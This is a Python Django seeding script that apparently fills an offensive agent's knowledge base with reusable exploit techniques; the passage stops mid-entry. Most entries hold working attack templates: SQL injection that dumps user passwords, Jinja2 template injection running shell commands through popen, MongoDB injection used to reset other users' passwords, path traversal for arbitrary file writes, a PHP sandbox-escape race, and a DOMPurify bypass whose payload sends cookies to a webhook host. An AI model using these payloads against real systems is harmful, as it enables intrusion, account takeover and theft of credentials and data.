"""Exploit technique seed — stored as *transferable tricks*, not per-challenge snapshots.

Each technique is one PayloadPattern row (source='technique') + standard schema in attack_metadata.
Schema definition / addition guide: agent/eval/KB_SCHEMA.md.

Usage:
  docker compose exec backend python manage.py seed_techniques
  docker compose exec backend python manage.py seed_techniques --reset
"""
from __future__ import annotations

from django.core.management.base import BaseCommand
from django.db import transaction

from api.embedding_service import (
    EMBEDDING_MODEL,
    embed_documents,
    is_available as embeddings_available,
)
from api.models import PayloadPattern, VulnerabilityEntry


# ── Technique definitions ────────────────────────────────────────────
# Each entry = one generalized transferable trick.
# attack_metadata schema (standard from KB_SCHEMA.md):
#   {
#     "kind": "exploit_technique",
#     "name": str,                    # human-readable
#     "applies_when": str,             # conditions in code/response that make this applicable
#     "prerequisites": [str, ...],     # required conditions
#     "technique_steps_md": str,       # markdown step-by-step
#     "code_template": str,            # parametrized payload template
#     "examples": [                    # known applications
#       {"params": {...}, "notes": str}
#     ],
#     "tags": [str, ...],
#   }

TECHNIQUES: list[dict] = [
    {
        "name": "exif_passthrough_marker",
        "vuln_type": "file_upload",
        "sub_technique": "exif_metadata_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["exif", "image", "passthrough", "marker"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EXIF passthrough — binary marker + JSON payload",
            "applies_when": (
                "The server searches uploaded JPEG EXIF data for magic bytes like `b\"<MARKER>\\x00\"` "
                "and parses the following bytes as JSON (applies to all metadata-inspection type challenges)"
            ),
            "prerequisites": [
                "Server processes EXIF via piexif/PIL — only standard EXIF tags are dumped",
                "Raw bytes append (img.info['exif']) is dropped by PIL save",
                "MakerNote(0x927C) or UserComment(0x9286) are standard free-form binary tags in Exif IFD",
            ],
            "technique_steps_md": (
                "1. piexif.load(image_exif) → exif_dict\n"
                "2. exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'<MARKER>\\x00<JSON>'\n"
                "   or use piexif.ExifIFD.UserComment (both accept free-form binary)\n"
                "3. piexif.dump(exif_dict) → exif_bytes\n"
                "4. img.save(out, format='JPEG', exif=exif_bytes)\n"
                "5. Server runs exif_data.find(b'<MARKER>\\x00') + len → JSON parse succeeds"
            ),
            "code_template": (
                "import io, piexif\n"
                "from PIL import Image\n"
                "img = Image.new('RGB', (100,100), {color})\n"
                "buf = io.BytesIO(); img.save(buf, format='JPEG')\n"
                "exif_dict = piexif.load(buf.getvalue())\n"
                "exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'{marker}\\x00' + {json_bytes}\n"
                "out = io.BytesIO()\n"
                "Image.open(io.BytesIO(buf.getvalue())).save(out, format='JPEG',\n"
                "                                            exif=piexif.dump(exif_dict))"
            ),
            "examples": [
                {
                    "params": {
                        "marker": "CUSTOM_MARKER",
                        "json_bytes": "b'{}'",
                        "tag_used": "MakerNote",
                    },
                    "notes": (
                        "UserComment / MakerNote both produce the same effect — server verification "
                        "searches for the marker in the full img.info['exif'] bytes."
                    ),
                },
            ],
            "tags": ["exif", "passthrough", "image_upload"],
        },
    },
    {
        "name": "pdo_emulate_prepare_question_mark_smuggling",
        "vuln_type": "sqli",
        "sub_technique": "pdo_emulate_prepare",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PDO emulate-prepare `?` smuggling — column/identifier injection",
            "applies_when": (
                "PHP PDO MySQL backend is in emulate prepare mode (default `PDO::ATTR_EMULATE_PREPARES=true`) "
                "and user input is dynamically concatenated into part of the prepared statement SQL string, "
                "allowing injection of an extra `?` token. Input normally goes into a column/identifier/table "
                "name position, but injecting a single `?` makes client-side prepare treat it as another "
                "placeholder → the WHERE clause `?` becomes unbound and our input takes its place."
            ),
            "prerequisites": [
                "PDO + MySQL (ineffective on other backends due to server-side prepare)",
                "ATTR_EMULATE_PREPARES=true (PDO MySQL default)",
                "Dynamically concatenated part is not wrapped in backticks, or input contains backticks to escape",
                "Binding pattern uses only one placeholder: execute([single_value])",
            ],
            "technique_steps_md": (
                "1. Identify: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` pattern\n"
                "2. Inject fake column name + `?` + comment + null byte into col_param: e.g. `\\?#\\x00`\n"
                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (2 `?` tokens total)\n"
                "3. PDO emulate prepare substitutes the first `?` with input as a string:\n"
                "   `SELECT \\<input_value>#\\0 FROM t WHERE x = ?`\n"
                "4. Inside input, close column with backtick and inject arbitrary SELECT subquery + `;#` to comment out trailing SQL\n"
                "5. Response: retrieve results bypassing column-display via `array_values($row)` (CSV/JSON dump)"
            ),
            "code_template": (
                "import requests\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/login.php', data={{'username': USER, 'password': PW}})\n"
                "r = s.get(f'{TARGET}/index.php', params={{\n"
                "    'col': '\\\\?#\\x00',\n"
                "    'name': \"x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#\",\n"
                    "    'download': '1',  # array_values dump is most robust\n"
                "}})\nprint(r.text)  # CSV: one row per line"
            ),
            "examples": [
                {
                    "params": {
                        "leak_column": "password",
                        "leak_table": "users",
                        "post_exploit": "admin login → further attack chain possible",
                    },
                    "notes": (
                        "ref: slcyber.io PDO research. CSV download option is useful for bypassing column-name "
                        "mapping — displayColumns is determined solely by colParam so the HTML table shows `-`, "
                        "but ?download=1 with array_values dumps the actual SELECT results as-is."
                    ),
                },
            ],
            "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        },
    },
    {
        "name": "safe_eval_attribute_chain",
        "vuln_type": "ssti",
        "sub_technique": "attribute_chain_filter_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_eval / Jinja2 attribute chain — filter bypass",
            "applies_when": (
                "User input reaches a sink like eval() / safe_eval() / render_template_string(), and "
                "allowed_globals or the Jinja2 environment exposes os/__builtins__/__class__/__mro__. "
                "Even with BLACKLIST filters (`(`, `)`, `__`, `os`, `import`, etc.), bypass is possible via "
                "attribute access (`a.b.c`), Jinja2 `attr()` filter, `~` string concat, or standard dict access."
            ),
            "prerequisites": [
                "Input reaches a sink that allows attribute access (`a.b`) expressions",
                "Result is exposed in response body/error/debug or side-effects (file read, OOB) are possible",
                "Filter bypass: if '(' is blocked, use dict comprehension or standard data access "
                "(`os.environ`, `request.application.__globals__`)",
                "For Jinja2: `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` style chain",
            ],
            "technique_steps_md": (
                "1. Identify sink: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)\n"
                "2. Map allowed_globals/builtins/class chain:\n"
                "   - Python eval: `os.environ` (simplest), `__builtins__.eval`, "
                "`().__class__.__mro__[1].__subclasses__()`\n"
                "   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` or "
                "`config.from_object`, `request.application.__globals__`\n"
                "3. Filter bypass: if '(' is forbidden, use dict access — `os.environ` is a dict so no call needed\n"
                "4. Output: extract from response body debug/error/template render result"
            ),
            "code_template": (
                "# Python eval/safe_eval\n"
                "payload = {expr}  # e.g.: 'os.environ'\n\n"
                "# Jinja2 SSTI BLACKLIST bypass\n"
                "payload = '{{ cycler|attr(\"_~_~init~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"_~_~globals~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"get\")(\"o~s\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"po~pen\".replace(\"~\",\"\"))(\"<cmd>\")'\n"
                "          '|attr(\"re~ad\".replace(\"~\",\"\"))() }}'"
            ),
            "examples": [
                {
                    "params": {
                        "sink": "safe_eval (Python)",
                        "expr": "os.environ",
                        "filter_bypassed": ["( blocked", ") blocked", "domain regex must pass"],
                        "output_path": "TRACE /verify response debug field",
                    },
                    "notes": "ImageDescription tag → safe_eval → dict(os.environ) → FLAG env leaked",
                },
                {
                    "transferable_verified": True,
                    "params": {
                        "sink": "Jinja2 render_template_string",
                        "expr": "cycler|attr('_'~'_'~'init'~'_'~'_')|attr(...)|attr('po'~'pen')",
                        "bypass_chars": "~ (concat, + blocked), attr() (. [] blocked), 'o'~'s' (os blocked)",
                        "filter_bypassed": [
                            "BLACKLIST: __ . [ ] + request config os subprocess "
                            "import init globals open read mro class",
                        ],
                        "output_path": "bash `case $(cat /flag|cut -c N) in C) sleep 4 ;; esac` "
                                       "→ POST /write response time (selenium bot blocks until /article load)",
                        "verified_signal": "baseline 2.45s, sleep trigger 5.37s, threshold 4.85s",
                    },
                    "notes": (
                        "OOB not possible (iptables outgoing DROP). Transferability proven — "
                        "Python eval pattern applies directly as a Jinja2 SSTI variant."
                    ),
                },
            ],
            "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        },
    },
    {
        "name": "dyson_multi_request_host_smuggling",
        "vuln_type": "ssrf",
        "sub_technique": "host_header_loopback_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["ssrf", "host-header", "multi-request", "ip-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "multiRequest Host-header loopback smuggling",
            "applies_when": (
                "A Node server parses hostname/port from the client-supplied Host header when "
                "fanning out internal requests. The multiRequest feature (splits on ',' in path "
                "fragment then fires http.get for each) uses `req.headers.host.split(':')` to "
                "determine the target. Sending Host: localhost:port makes the server issue a "
                "loopback request to itself → req.socket.remoteAddress=127.0.0.1."
            ),
            "prerequisites": [
                "Server code checks `req.socket.remoteAddress` for IP (127.0.0.1 whitelist, etc.)",
                "dyson-generators or similar framework allowing Host header-based internal redirect",
                "Route goes through multiRequest middleware",
                "multiRequest delimiter (default ',') is known",
            ],
            "technique_steps_md": (
                "1. Identify IP check / internal-only endpoints in the server code.\n"
                "2. Find routes on the same server that go through multiRequest middleware "
                "(dyson-generators enables this on all routes by default).\n"
                "3. Insert a fragment containing ',' in the URL path — after split, each id is used in "
                "path.replace(arr, id) for loopback http.get.\n"
                "4. **Set Host header to `localhost:<internal_port>`** — the server makes an internal "
                "request to itself. That request's remoteAddress = 127.0.0.1.\n"
                "5. Ensure at least one sub-request URL matches the target route by arranging "
                "both sides of `,` as valid paths. Pass query strings by interleaving with `?` "
                "(e.g. `/api/X?guess=V&extra,X?guess=V`).\n"
            ),
            "code_template": (
                "# url template: /<route>?<params>&<pad>,<route_tail>?<params>\n"
                "# Host header must be 'localhost:<internal_port>'\n"
                "import urllib.request\n"
                "req = urllib.request.Request(\n"
                "    'http://<target>/<route>?<params>&extra,<route_tail>?<params>',\n"
                "    headers={'Host': 'localhost:<internal_port>'},\n"
                ")\n"
                "r = urllib.request.urlopen(req, timeout=10)\n"
            ),
            "examples": [
                {
                    "params": {
                        "route": "/api/protectedService",
                        "payload_path": (
                            "/api/protectedService?param=val&extra,protectedService?param=val"
                        ),
                        "host_header": "localhost:3000",
                        "internal_port": 3000,
                        "bypass_target": "req.socket.remoteAddress == 127.0.0.1 check",
                    },
                    "notes": (
                        "multiRequest: path fragment with ',' → range.split(',') → each "
                        "id path.replace → http.get({hostname, port from Host header, path}). "
                        "Host=localhost:3000 → backend loops back to itself, inner handler sees "
                        "remoteAddress=127.0.0.1."
                    ),
                },
            ],
            "tags": ["ssrf", "host-header", "loopback", "ip-bypass"],
        },
    },
    {
        "name": "js_asi_const_overwrite",
        "vuln_type": "xss",
        "sub_technique": "js_parser_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["javascript", "asi", "const", "parser-quirk", "nodejs"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "JS Automatic Semicolon Insertion — const literal overwrite",
            "applies_when": (
                "In JavaScript source, `const X = \"<value>\"` is not followed by a semicolon and the "
                "next line starts with `[a, b] = expr`. ASI interprets `[` after a string literal as "
                "member-access and does not insert a semicolon → the whole thing is parsed as a single "
                "statement `const X = \"...\"[a,b] = expr`. The comma expression `[a,b]` evaluates to `b` → "
                "`\"...\"[b] = expr` is a string prop assignment (silent fail in sloppy mode), and the "
                "assignment expression value = expr. Result: `const X = expr` — const overwritten with attacker-controlled value."
            ),
            "prerequisites": [
                "Analyzable JS source (difficult in blackbox, but possible with source leak/writeup)",
                "Declaration: `const X = \"literal\"` missing semicolon at end",
                "Immediately next line: `[var1, var2] = <attacker_controlled_expr>`",
                "Sloppy mode (strict mode would throw TypeError — must not be strict)",
                "Subsequent comparison: `X == something` where attacker can make expr value equal to one side",
            ],
            "technique_steps_md": (
                "1. Search JS source for `const ... = \"...\"` lines missing a trailing semicolon.\n"
                "2. If the next line matches `[...] = <expr>` pattern, `X` is overwritten with expr.\n"
                "3. Check for comparison (`if (X == target)`) — if attacker can make expr result "
                "equal to target, the check is bypassed.\n"
                "4. Exploit JS loose equality (`==`) coercion — e.g.: `[\"0000\"] == false` → "
                "array→string `\"0000\"` → number `0` ↔ `false` → `0` → true.\n"
                "5. Inject payload into expr source (req.query, req.body, etc.).\n"
            ),
            "code_template": (
                "// vulnerable source pattern:\n"
                "//   const TARGET = \"...\"\n"
                "//   [a, b] = req.query.X !== undefined ? atob(req.query.X).split(\"|\") : [...]\n"
                "// attacker sends X=<base64> such that after atob+split, compared value == initial false/0/null.\n"
                "// example: X=MDAwMA== (atob=\"0000\") → TARGET=[\"0000\"] → [\"0000\"] == false → 0==0 → true\n"
            ),
            "examples": [
                {
                    "params": {
                        "guess": "MDAwMA==",
                        "atob_decoded": "0000",
                        "final_compare": "[\"0000\"] == false  -> \"0000\" == 0 -> true",
                        "overwritten_const": "SecretVariable",
                    },
                    "notes": (
                        "const SecretVariable = \"[REDACTED]\"\\n[param1, param2] = "
                        "req.query.guess !== undefined ? atob(req.query.guess).split(\"|\") : [...] "
                        "→ ASI fails, parsed as one statement. Attacker controls guess → SecretVariable "
                        "itself is overwritten with an array. Comparison operand is false (initial value), "
                        "so array→0 coercion matches."
                    ),
                },
            ],
            "tags": ["javascript", "asi", "const", "type-coercion", "nodejs"],
        },
    },
    # ── NoSQL / path traversal techniques ────────────────────────
    {
        "name": "mongodb_regexp_injection_email_leak",
        "vuln_type": "nosqli",
        "sub_technique": "regexp_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["nosql", "mongodb", "regex", "regexp-injection", "brute-force", "email-leak"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MongoDB RegExp injection — character-by-character data leak",
            "applies_when": (
                "The server converts user input to `new RegExp(input)` without sanitization and "
                "uses it in MongoDB queries like `findOne({field: regex})`. An attacker can inject regex "
                "metacharacters (`^`, `.*`, `$`, `[a-z]`, etc.) to brute-force existing data one character "
                "at a time. Typically found in registration duplicate checks, search, login, etc."
            ),
            "prerequisites": [
                "User input is passed directly to `new RegExp()` or `{$regex: input}`",
                "Response differentiates between exists/not-exists (e.g. 400 'exists' vs 200 'ok')",
                "Response speed allows brute-force (no rate limiting or loose limits)",
            ],
            "technique_steps_md": (
                "1. Verify regex metacharacters work on the target field: send `^a.*` → check if existing data matches\n"
                "2. Extend prefix one character at a time: `^guide_a.*`, `^guide_ab.*`, ... → if exists response, that character is confirmed\n"
                "3. When no more characters match, the current prefix is the full value\n"
                "4. Handle special characters: escape regex metacharacters (`$`, `*`, `+`, etc.) using character classes `[$]`, `[*]`\n"
                "5. Use extracted value (email, token, etc.) for the next attack stage"
            ),
            "code_template": (
                "import string, requests\n"
                "url = f'{TARGET}/api/auth/register'\n"
                "charset = list(string.ascii_lowercase + string.digits)\n"
                "prefixes = ['^{known_prefix}']\n"
                "while prefixes:\n"
                "    nxt = []\n"
                "    for pfx in prefixes:\n"
                "        for ch in charset:\n"
                "            r = requests.post(url, json={{'email': f'{{pfx}}{{ch}}.*', 'username': ''}})\n"
                "            if '{exists_indicator}' in r.text:\n"
                "                nxt.append(pfx + ch)\n"
                "    prefixes = nxt\n"
                "# if prefixes is empty, the last prefix is the full value"
            ),
            "examples": [
                {
                    "params": {
                        "field": "email",
                        "endpoint": "POST /api/auth/register",
                        "server_code": "User.findOne({email: new RegExp(['^', String(email), '$'].join(''), 'i')})",
                        "exists_indicator": "User already exists",
                        "charset": "a-z0-9",
                    },
                    "notes": (
                        "Email is converted to RegExp in the registration duplicate check. "
                        "Bypass prefix check with `^prefix_` — "
                        "even if the server constructs `'^' + '^prefix_a.*' + '$'` = `^^prefix_a.*$`, "
                        "in JS regex `^^` is equivalent to `^`."
                    ),
                },
            ],
            "tags": ["nosql", "mongodb", "regex", "brute-force"],
        },
    },
    {
        "name": "nosql_operator_injection_token_bypass",
        "vuln_type": "nosqli",
        "sub_technique": "operator_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["nosql", "mongodb", "operator-injection", "password-reset", "auth-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MongoDB operator injection ($ne/$gt/$regex) — auth/token bypass",
            "applies_when": (
                "An Express/Node server parses `req.body` as JSON and passes the value directly "
                "to a MongoDB query (`findOne({field: value})`). Since `bodyParser.json()` also parses "
                "objects/arrays, sending `{\"field\": {\"$ne\": null}}` results in "
                "`findOne({field: {$ne: null}})` → matches all documents where token/password/secret "
                "is not null. Applies to password reset, API key verification, 2FA token checks, etc."
            ),
            "prerequisites": [
                "Express bodyParser.json() or similar JSON body parser in use",
                "req.body values are passed to MongoDB queries without sanitization",
                "Documents with non-null values exist in the DB for the target field",
                "Mongoose SchemaType validation is not restricted to String, or can be bypassed",
            ],
            "technique_steps_md": (
                "1. Identify API that sends token/code in the body (e.g. password reset)\n"
                "2. First, trigger normal flow to generate a token for the target account (e.g. send email)\n"
                "3. Send `{\"$ne\": null}` in the token field → matches any user with an existing token\n"
                "   Variants: `{\"$gt\": \"\"}` (all values greater than empty string), `{\"$regex\": \".*\"}` (all values)\n"
                "4. Change password / bypass 2FA / hijack session for the matched user\n"
                "5. Login with the changed credentials"
            ),
            "code_template": (
                "import requests\n"
                "# Step 1: generate reset token for target\n"
                "requests.post(f'{TARGET}/api/auth/reset',\n"
                "              json={{'email': '{target_email}', 'sendMail': False}})\n"
                "# Step 2: bypass token with $ne operator\n"
                "r = requests.post(f'{TARGET}/api/auth/reset',\n"
                "                  json={{'token': {{'$ne': None}}, 'password': '{new_password}'}})\n"
                "# Step 3: login with new password\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/api/auth/login',\n"
                "       json={{'email': '{target_email}', 'password': '{new_password}'}})"
            ),
            "examples": [
                {
                    "params": {
                        "endpoint": "POST /api/auth/reset",
                        "vulnerable_code": "User.findOne({resetPassToken: token})",
                        "payload": '{"token": {"$ne": null}, "password": "newpw"}',
                        "target_role": "privileged user",
                    },
                    "notes": (
                        "resetPassword flow: (1) email→generateToken → sets resetPassToken, "
                        "(2) token→sendResetPassword → User.findOne({resetPassToken: token}). "
                        "sendMail=false generates the token without sending email. "
                        "$ne:null matches any user with an existing token → password reset."
                    ),
                },
            ],
            "tags": ["nosql", "mongodb", "operator-injection", "auth-bypass"],
        },
    },
    {
        "name": "multer_unicode_path_traversal",
        "vuln_type": "path_traversal",
        "sub_technique": "unicode_encoding_bypass",
        "category": "exploitation",
        "safety_level": "dangerous",
        "tags": ["path-traversal", "multer", "unicode", "file-upload", "nodejs", "encoding"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Multer latin1→utf8 Unicode path traversal (丯 = /)",
            "applies_when": (
                "Express + multer file upload converts filename via `Buffer.from(name, 'latin1').toString('utf-8')` "
                "and uses the result directly in the `diskStorage` filename callback. "
                "Sending Unicode character `丯` (U+4E2F, UTF-8: E4 B8 AF) via RFC5987 `filename*=UTF-8''...` "
                "encoding causes the latin1→utf8 conversion to produce `/` in the OS path, escaping the upload directory."
            ),
            "prerequisites": [
                "multer diskStorage in use (memory storage does not write files)",
                "filename callback uses `file.originalname` directly without path.basename()",
                "latin1→utf8 conversion logic exists (added in some multer configs for CJK filename support)",
                "Account with upload permissions needed (e.g. guide/admin — combine with separate auth bypass)",
            ],
            "technique_steps_md": (
                "1. Verify the upload endpoint and multer config (diskStorage + filename callback)\n"
                "2. Confirm `Buffer.from(name, 'latin1').toString('utf-8')` conversion is present\n"
                "3. Use RFC5987 encoding in the multipart form:\n"
                "   `Content-Disposition: form-data; name=\"image\"; filename*=UTF-8''..%E4%B8%AF..%E4%B8%AF...target`\n"
                "   `..丯` equals `../` (丯's UTF-8 E4 B8 AF → interpreted as latin1 → utf8 → `/`)\n"
                "4. Traversal depth: repeat `..丯` enough times to escape to root (~13 times)\n"
                "5. Write payload to target path (e.g. `/proc/self/fd/N`, `/tmp/exploit.sh`)\n"
                "6. Follow-up: manipulate Node process memory via /proc/self/fd/ (ROP) or overwrite cron/script"
            ),
            "code_template": (
                "from urllib.parse import quote\n"
                "import requests\n\n"
                "traversal = '..丯' * 13 + '{target_path}'.replace('/', '丯')\n"
                "fn_rfc = \"UTF-8''\" + quote(traversal)\n"
                "boundary = '----Exploit'\n"
                "body = f'--{{boundary}}\\r\\n'\n"
                "body += f'Content-Disposition: form-data; name=\"image\"; filename*={{fn_rfc}}\\r\\n'\n"
                "body += 'Content-Type: application/octet-stream\\r\\n\\r\\n'\n"
                "body = body.encode('utf-8') + {payload_bytes} + f'\\r\\n--{{boundary}}--\\r\\n'.encode('utf-8')\n"
                "r = session.put(f'{{TARGET}}/api/answers/{{uuid}}', data=body,\n"
                "                headers={{'Content-Type': f'multipart/form-data; boundary={{boundary}}'}})"
            ),
            "examples": [
                {
                    "params": {
                        "endpoint": "PUT /api/answers/:uuid (multer upload.single('image'))",
                        "encoding_line": "file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf-8')",
                        "unicode_char": "丯 (U+4E2F)",
                        "traversal_target": "/proc/self/fd/N (ROP) or /tmp/ (arbitrary write)",
                    },
                    "notes": (
                        "After obtaining privileges via auth bypass, use multer upload for path traversal. "
                        "Writing ROP payload to /proc/self/fd/ can crash the Node process → execve possible."
                    ),
                },
            ],
            "tags": ["path-traversal", "multer", "unicode", "file-upload", "encoding"],
        },
    },
    # ── PHP sandbox escape technique ────────────────────────────
    {
        "name": "php_open_basedir_race_pcntl_fork",
        "vuln_type": "lfi",
        "sub_technique": "open_basedir_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "lfi", "sandbox-escape"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PHP open_basedir bypass — pcntl_fork + rename race on getcwd/MAXPATHLEN",
            "applies_when": (
                "PHP 8.x environment where `open_basedir` is restricted to `/tmp` etc., "
                "`pcntl_fork` is not in `disable_functions` (pcntl extension enabled), "
                "and arbitrary PHP code execution is possible (eval gate, webshell, file upload, etc.). "
                "Even if command execution functions (system/exec/popen) are blocked, "
                "`file_get_contents` can read files outside open_basedir like `/flag.txt`."
            ),
            "prerequisites": [
                "Arbitrary PHP code execution possible (eval, include, etc.)",
                "pcntl_fork() is not in disable_functions",
                "open_basedir includes /tmp (mkdir/rename must be available)",
                "ini_set('open_basedir', ...) callable (not set via php_admin_value)",
            ],
            "technique_steps_md": (
                "1. `chdir('/tmp')` → `mkdir('start/')` → `chdir('start/')`\n"
                "2. Create deep directory with `str_repeat('a' * 249 . '/', N)` so the path length is "
                "just below 4096 (MAXPATHLEN), then `chdir` into it\n"
                "3. `pcntl_fork()` — split into child and parent\n"
                "4. **Child**: repeatedly attempts `ini_set('open_basedir', $cur . ':../')`. "
                "When parent renames the path to exceed 4096, `getcwd()` fails → "
                "`expand_filepath('../')` falls back to `VCWD_OPEN('../')` → returns `../` as-is → "
                "successfully adds `../` to open_basedir\n"
                "5. **Parent**: renames `/tmp/start` to `/tmp/xxxxxx...(250 chars)` and back repeatedly "
                "(toggles path length across the 4096 boundary)\n"
                "6. Child: after race succeeds, `chdir('/tmp'); chdir('../')` → escapes open_basedir\n"
                "7. `file_get_contents('/flag.txt')` to read the flag"
            ),
            "code_template": (
                "chdir('/tmp');\n"
                "@mkdir('start/');\n"
                "chdir('start/');\n"
                "$cur_dir_len = strlen(getcwd());\n"
                "$depth = str_repeat(str_repeat('a', 249).'/', 16 - floor($cur_dir_len / 250));\n"
                "@mkdir($depth, 0755, true);\n"
                "chdir($depth);\n"
                "$pid = pcntl_fork();\n"
                "if($pid == 0) {\n"
                "  for ($i=0; $i<25; $i++) {\n"
                "    usleep(300);\n"
                "    ini_set('open_basedir', ini_get('open_basedir').':../');\n"
                "  }\n"
                "  chdir('/tmp'); chdir('../');\n"
                "  echo file_get_contents('{flag_path}');\n"
                "} else {\n"
                "  chdir('/tmp');\n"
                "  for ($i=0; $i<30000; $i++) {\n"
                "    usleep(30);\n"
                "    @rename('start', str_repeat('x', 250));\n"
                "    @rename(str_repeat('x', 250), 'start');\n"
                "  }\n"
                "}"
            ),
            "examples": [
                {
                    "params": {
                        "open_basedir": "/var/www/html:/tmp",
                        "disabled_functions": "system,exec,shell_exec,popen,proc_open,passthru,... (pcntl_fork excluded)",
                        "flag_path": "/flag.txt",
                        "eval_gate": "?key=KEY&code=<php_code>",
                        "race_success_rate": "high success rate on first attempt",
                    },
                    "notes": (
                        "Targets PHP 8.4-cli. Bug in expand_filepath(): VCWD_GETCWD → getcwd() "
                        "fails when exceeding MAXPATHLEN(4096), fallback VCWD_OPEN(filepath) "
                        "succeeds and returns filepath as realpath as-is. "
                        "Triggered via race condition."
                    ),
                },
            ],
            "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "sandbox-escape"],
        },
    },
    # ── Auth bypass / XSS chain techniques ─────────────────────
    {
        "name": "mysql_object_injection_auth_bypass",
        "vuln_type": "sqli",
        "sub_technique": "object_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["mysql", "object-injection", "auth-bypass", "type-confusion", "nodejs"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MySQL object injection auth bypass — JSON object as parameterized query value",
            "applies_when": (
                "A Node.js app uses mysql/mysql2 driver with parameterized queries but does not "
                "validate the type of user input (req.body.password, etc.), allowing JSON objects to be "
                "passed directly. With Express's express.json() middleware enabled, nested objects like "
                "{ \"password\": { \"password\": 1 } } are parsed as-is."
            ),
            "prerequisites": [
                "Node.js + mysql/mysql2 driver in use",
                "express.json() middleware enabled (Content-Type: application/json)",
                "User input passed to parameterized query without type validation",
                "Query like SELECT * FROM users WHERE username = ? AND password = ?",
            ],
            "technique_steps_md": (
                "1. Identify target login endpoint: `POST /auth/login` + `Content-Type: application/json`\n"
                "2. Pass object in password field: `{\"username\": \"admin\", \"password\": {\"password\": 1}}`\n"
                "3. mysql2 driver serializes the object to `` `password` = 1 ``\n"
                "4. Final SQL: `WHERE username = 'admin' AND password = \\`password\\` = 1`\n"
                "5. `password = \\`password\\`` → column compared to itself → always 1 (true)\n"
                "6. `1 = 1` → true → authentication bypass successful"
            ),
            "code_template": (
                "import requests\n"
                "r = requests.post('{url}/auth/login',\n"
                "    json={'username': '{target_user}', 'password': {'password': 1}})\n"
                "token = r.json().get('token')\n"
                "# use token to access admin functionality"
            ),
            "examples": [
                {
                    "params": {
                        "driver": "mysql2",
                        "query": "SELECT * FROM users WHERE username = ? AND password = ?",
                        "payload": '{"username": "admin", "password": {"password": 1}}',
                    },
                    "notes": (
                        "mysql2 driver serializes objects to `col = val` form. "
                        "password = `password` = 1 becomes (password = password) = 1 → 1 = 1 → true. "
                        "This technique bypasses even parameterized queries, so "
                        "typeof validation or input schema validation is essential."
                    ),
                },
            ],
            "tags": ["mysql", "object-injection", "auth-bypass", "type-confusion", "nodejs", "express"],
        },
    },
    {
        "name": "dompurify_mxss_custom_element_safe_for_templates",
        "vuln_type": "xss",
        "sub_technique": "mxss_dom_clobbering",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["xss", "mxss", "dompurify", "custom-element", "mutation-xss", "sanitizer-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "DOMPurify mXSS bypass via custom elements + SAFE_FOR_TEMPLATES config",
            "applies_when": (
                "DOMPurify is configured with SAFE_FOR_TEMPLATES: true and CUSTOM_ELEMENT_HANDLING "
                "(tagNameCheck: /^custom-/). When sanitized HTML is assigned to innerHTML, "
                "DOM mutation can cause event handlers to survive."
            ),
            "prerequisites": [
                "DOMPurify with SAFE_FOR_TEMPLATES: true",
                "CUSTOM_ELEMENT_HANDLING with tagNameCheck for custom- prefix",
                "Sanitize output is assigned to innerHTML",
                "CSP allows inline script/event handlers (unsafe-inline, etc.)",
            ],
            "technique_steps_md": (
                "1. Check DOMPurify config: `SAFE_FOR_TEMPLATES`, `CUSTOM_ELEMENT_HANDLING`\n"
                "2. Construct mutation XSS payload: combine `<math>`, `<table>`, `<custom-*>` tags to "
                "induce structural changes during DOM parsing\n"
                "3. Use template syntax like `<! \\${` inside `<style>` tag to confuse the parser\n"
                "4. Insert event handler inside attribute via `<custom-b id=\">...\">` form\n"
                "5. After sanitize, innerHTML assignment triggers DOM reparse → `<img onerror=...>` activates\n"
                "6. XSS fires: `location.href='...' + document.cookie`"
            ),
            "code_template": (
                '<math><custom-test><mi><li><table><custom-test><li></li></custom-test>'
                '<a><style><! \\${</style>}<custom-b id=">'
                "<img src onerror='location.href=`{webhook}/?token=`+document.cookie'>"
                '">test</custom-b></a></table></li></mi></custom-test></math>'
            ),
            "examples": [
                {
                    "params": {
                        "dompurify_config": "SAFE_FOR_TEMPLATES: true, CUSTOM_ELEMENT_HANDLING: {tagNameCheck: /^custom-/}",
                        "sink": "innerHTML assignment in admin page",
                        "delivery": "base64 encoded in URL query parameter",
                    },
                    "notes": (
